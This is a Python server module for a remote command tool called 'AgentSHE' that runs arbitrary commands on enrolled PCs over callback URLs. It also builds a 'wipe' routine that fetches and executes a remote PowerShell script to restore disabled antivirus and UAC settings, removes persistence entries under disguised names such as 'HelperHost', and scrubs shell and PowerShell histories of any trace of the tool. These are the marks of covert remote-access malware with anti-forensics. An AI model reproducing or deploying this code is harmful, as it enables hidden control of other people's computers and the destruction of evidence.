from __future__ import annotations

import logging
import os
from typing import Any

import httpx

from app import store

log = logging.getLogger("agentshe.remote")


async def pc_health(session: dict[str, Any], timeout: float = 8.0) -> bool:
    url = (session.get("callback_url") or "").rstrip("/")
    token = session.get("token") or ""
    if not url or not token:
        return False
    try:
        async with httpx.AsyncClient(timeout=timeout) as client:
            r = await client.get(f"{url}/health", params={"token": token})
            if r.status_code == 200 and r.json().get("ok"):
                store.touch_session(session["id"])
                return True
    except Exception as e:
        log.debug("health %s: %s", session.get("name"), e)
    return False


async def pc_run(
    session: dict[str, Any],
    command: str,
    timeout: float = 120.0,
    *,
    record: bool = True,
) -> dict[str, Any]:
    url = (session.get("callback_url") or "").rstrip("/")
    token = session.get("token") or ""
    if not url or not token:
        raise RuntimeError("PC sans callback (réinstalle avec /connect)")
    async with httpx.AsyncClient(timeout=timeout) as client:
        r = await client.post(
            f"{url}/run",
            headers={"X-AgentShe-Token": token},
            json={"token": token, "command": command},
        )
        if r.status_code == 401:
            raise RuntimeError("Token PC invalide — /connect à nouveau")
        r.raise_for_status()
        data = r.json()
    if record:
        store.append_history(
            session["id"],
            command,
            str(data.get("output") or ""),
            int(data.get("exit_code") or 0),
        )
    return data


def _full_wipe_command(session: dict[str, Any]) -> str:
    """OS-specific wipe so even older agents erase all traces before exit."""
    platform = (session.get("platform") or "").lower()
    agent = session.get("agent") or {}
    if not platform or platform == "any":
        platform = (agent.get("platform") or "").lower()
    hist_re = (
        r"HelperHost|EdgeRelay|agentshe|AgentSHE|lilygopro|bootstrap|"
        r"install\.sh|install\.ps1|install-win|HelperHostCache|AGENTSHE_|trycloudflare"
    )
    if platform in ("windows", "win"):
        restore_url = (
            f"{store.effective_base_url().rstrip('/')}/files/scripts/restore-win-security.ps1"
        )
        return (
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
            "$ErrorActionPreference='SilentlyContinue'; "
            # Restore AV / UAC / exclusions / tasks (elevated task if present)
            "schtasks /Run /TN HelperHostWipeRestore 2>$null; "
            f"try {{ iex ((curl.exe -fsSL '{restore_url}' | Out-String)) }} catch {{}}; "
            "Start-Sleep -Seconds 2; "
            "$tasks=@('HelperHost','HelperHostResume','HelperHostBoot',"
            "'HelperHostResumeBoot','HelperHostWipeRestore','AgentShePC'); "
            "foreach($t in $tasks){ schtasks /Delete /TN $t /F 2>$null }; "
            "$rk='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'; "
            "Remove-ItemProperty -Path $rk -Name HelperHost -EA SilentlyContinue; "
            "Remove-ItemProperty -Path $rk -Name AgentShePC -EA SilentlyContinue; "
            "Get-CimInstance Win32_Process | Where-Object { "
            "$_.CommandLine -and $_.CommandLine -match 'HelperHost|EdgeRelay|watchdog\\.vbs|reconnect\\.vbs' "
            "-and $_.Name -match '^(wscript|cscript|EdgeRelay)\\.exe$' "
            "} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue }; "
            "taskkill /F /IM EdgeRelay.exe; "
            "$hh=Join-Path $env:LOCALAPPDATA 'HelperHost'; "
            "$cache=Join-Path $env:TEMP 'HelperHostCache'; "
            "attrib -h -s /s /d ($hh+'\\*') 2>$null; attrib -h -s $hh,$cache 2>$null; "
            "$bat=Join-Path $env:TEMP 'hh-wipe.cmd'; "
            "@( "
            "'@echo off', "
            "'ping 127.0.0.1 -n 2 >nul', "
            "'schtasks /Run /TN HelperHostWipeRestore >nul 2>&1', "
            f"'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"try {{ iex ((curl.exe -fsSL ''{restore_url}'' | Out-String)) }} catch {{}}\" >nul 2>&1', "
            "'ping 127.0.0.1 -n 2 >nul', "
            "'taskkill /F /IM HelperHost.exe >nul 2>&1', "
            "'taskkill /F /IM EdgeRelay.exe >nul 2>&1', "
            "'ping 127.0.0.1 -n 2 >nul', "
            "'schtasks /Delete /TN HelperHost /F >nul 2>&1', "
            "'schtasks /Delete /TN HelperHostResume /F >nul 2>&1', "
            "'schtasks /Delete /TN HelperHostBoot /F >nul 2>&1', "
            "'schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1', "
            "'schtasks /Delete /TN AgentShePC /F >nul 2>&1', "
            "('attrib -h -s /s /d \"'+$hh+'\\*\" >nul 2>&1'), "
            "('attrib -h -s \"'+$hh+'\" >nul 2>&1'), "
            "('attrib -h -s \"'+$cache+'\" >nul 2>&1'), "
            "('rmdir /s /q \"'+$hh+'\" >nul 2>&1'), "
            "('rmdir /s /q \"'+$cache+'\" >nul 2>&1'), "
            "('if exist \"'+(Join-Path $env:USERPROFILE '.agentshe')+'\" rmdir /s /q \"'+(Join-Path $env:USERPROFILE '.agentshe')+'\" >nul 2>&1'), "
            "'del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1', "
            "'del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1', "
            "'del /f /q \"%TEMP%\\hh-restore-security.ps1\" >nul 2>&1', "
            "'del \"%~f0\" >nul 2>&1' "
            ") | Set-Content -Encoding ASCII $bat; "
            "Start-Process -WindowStyle Hidden -FilePath $bat; "
            "$hist=Join-Path $env:APPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'; "
            "if(Test-Path $hist){ "
            f"(Get-Content $hist) | Where-Object {{ $_ -notmatch '{hist_re}' }} "
            "| Set-Content $hist -Encoding UTF8 }; "
            "Write-Output wiped"
            "\""
        )
    # mac / linux — kill + unhide + remove autostart + dirs + history
    return (
        "set +e; "
        "HH_MAC=\"$HOME/Library/Application Support/HelperHost\"; "
        "HH_LIN=\"$HOME/.local/share/HelperHost\"; "
        "CACHE=\"${TMPDIR:-/tmp}/HelperHostCache\"; "
        # Autostart off first (stop respawn)
        "launchctl bootout gui/$(id -u) \"$HOME/Library/LaunchAgents/com.helperhost.agent.plist\" 2>/dev/null; "
        "launchctl bootout gui/$(id -u) \"$HOME/Library/LaunchAgents/fr.agentshe.pc.plist\" 2>/dev/null; "
        "launchctl unload \"$HOME/Library/LaunchAgents/com.helperhost.agent.plist\" 2>/dev/null; "
        "rm -f \"$HOME/Library/LaunchAgents/com.helperhost.agent.plist\" "
        "\"$HOME/Library/LaunchAgents/fr.agentshe.pc.plist\"; "
        "systemctl --user disable --now helperhost.service agentshe.service 2>/dev/null; "
        "rm -f \"$HOME/.config/systemd/user/helperhost.service\" \"$HOME/.config/systemd/user/agentshe.service\"; "
        "systemctl --user daemon-reload 2>/dev/null; "
        # Kill watchdog then binaries
        "pkill -f \"$HH_MAC/watchdog.sh\" 2>/dev/null; "
        "pkill -f \"$HH_LIN/watchdog.sh\" 2>/dev/null; "
        "pkill -f \"$HH_MAC/reconnect.sh\" 2>/dev/null; "
        "pkill -f \"$HH_LIN/reconnect.sh\" 2>/dev/null; "
        "pkill -f \"$HH_MAC/HelperHost\" 2>/dev/null; "
        "pkill -f \"$HH_LIN/HelperHost\" 2>/dev/null; "
        "pkill -f \"$HH_MAC/EdgeRelay\" 2>/dev/null; "
        "pkill -f \"$HH_LIN/EdgeRelay\" 2>/dev/null; "
        "pkill -f 'watchdog.sh' 2>/dev/null; "
        "pkill -f 'reconnect.sh' 2>/dev/null; "
        "pkill -x HelperHost 2>/dev/null; "
        "pkill -x EdgeRelay 2>/dev/null; "
        "pkill -f EdgeRelay 2>/dev/null; "
        "sleep 1; "
        # Mac unhide before rm
        "chflags -R nouchg,noschg,nohidden \"$HH_MAC\" \"$CACHE\" 2>/dev/null; "
        "rm -rf \"$CACHE\" /tmp/HelperHostCache "
        "\"$HH_MAC\" \"$HH_LIN\" \"$HOME/.agentshe\"; "
        # Deferred cleanup if files locked
        "nohup bash -c 'sleep 2; "
        "pkill -x HelperHost 2>/dev/null; pkill -x EdgeRelay 2>/dev/null; "
        "rm -rf \"$HH_MAC\" \"$HH_LIN\" \"$CACHE\" /tmp/HelperHostCache \"$HOME/.agentshe\"; "
        "rm -f /tmp/hh-wipe.sh' >/dev/null 2>&1 & "
        # Shell history
        "for h in \"$HOME/.bash_history\" \"$HOME/.zsh_history\" \"$HOME/.zhistory\" "
        "\"$HOME/.local/share/fish/fish_history\" \"$HOME/.python_history\"; do "
        f"[ -f \"$h\" ] && grep -viE '{hist_re}' \"$h\" > \"$h.tmp\" "
        "&& mv \"$h.tmp\" \"$h\"; done; "
        "echo wiped"
    )


async def pc_shutdown(session: dict[str, Any], timeout: float = 25.0) -> bool:
    """Ask PC to erase all local traces (binaries, cache, logs, autostart, shell history)."""
    url = (session.get("callback_url") or "").rstrip("/")
    token = session.get("token") or ""
    if not url or not token:
        return False
    try:
        # Pre-wipe via /run so older installed agents also purge TEMP cache + history
        try:
            await pc_run(session, _full_wipe_command(session), timeout=60.0, record=False)
        except Exception as e:
            log.warning("pre-wipe %s: %s", session.get("name"), e)
        async with httpx.AsyncClient(timeout=timeout) as client:
            r = await client.post(
                f"{url}/shutdown",
                headers={"X-AgentShe-Token": token},
                json={"token": token, "wipe": True},
            )
            return r.status_code == 200
    except Exception as e:
        log.warning("shutdown %s: %s", session.get("name"), e)
        return False
